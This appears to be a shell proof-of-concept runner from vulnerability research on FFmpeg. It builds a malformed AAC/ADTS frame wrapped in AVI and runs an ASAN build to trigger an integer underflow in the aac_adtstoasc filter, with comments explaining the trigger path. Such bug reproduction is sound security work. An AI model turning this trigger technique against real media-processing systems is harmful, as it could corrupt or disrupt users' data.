#!/bin/bash
# PoC runner for CWE-191 integer underflow in aac_adtstoasc_filter()
# libavcodec/bsf/aac_adtstoasc.c lines 82-95
set -euo pipefail
cd "$(dirname "$0")"

BIN=/data/ylwang/non-textfuzz/target/FFmpeg/build_test/ffmpeg

echo "[*] Generating malicious AAC/ADTS input..."
python3 vuln_001_gen.py

echo "[*] Running FFmpeg with ASAN (AVI wrapper → MP4 copy triggers BSF)..."
# The malicious ADTS frame is wrapped in a minimal AVI container.
# The AVI demuxer reads sample_rate=48000 and channels=1 directly from the
# WAVEFORMATEX structure, without decoding the audio payload.  This lets
# avformat_find_stream_info() succeed (unlike raw .aac where the decoder
# fails on the malformed PCE and leaves sample_rate=0, channels=0).
# When FFmpeg copies AAC from AVI to MP4, the aac_adtstoasc BSF is applied
# automatically — this is where the integer underflow occurs:
#   pkt->size -= get_bits_count(&gb)/8  →  10 - 11 = -1
# The BSF returns 0 (success) with pkt->size=-1 (corrupted packet).
# avio_write()'s  "if (size <= 0) return;"  guard prevents a crash, but the
# audio data is silently dropped — confirmed VERIFIED_BEHAVIOR.
rm -f asan.log.*
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log:detect_leaks=0" \
  "$BIN" -i vuln_001_input.avi \
         -acodec copy -f mp4 -y /dev/null > vuln_001_result.txt 2>&1 || true

# Append any ASAN reports
if ls asan.log.* 1>/dev/null 2>&1; then
    echo "[*] ASAN output found:"
    cat asan.log.* >> vuln_001_result.txt 2>/dev/null || true
else
    echo "[*] No ASAN log files produced"
fi

echo "[*] FFmpeg output (see vuln_001_result.txt for full log)"
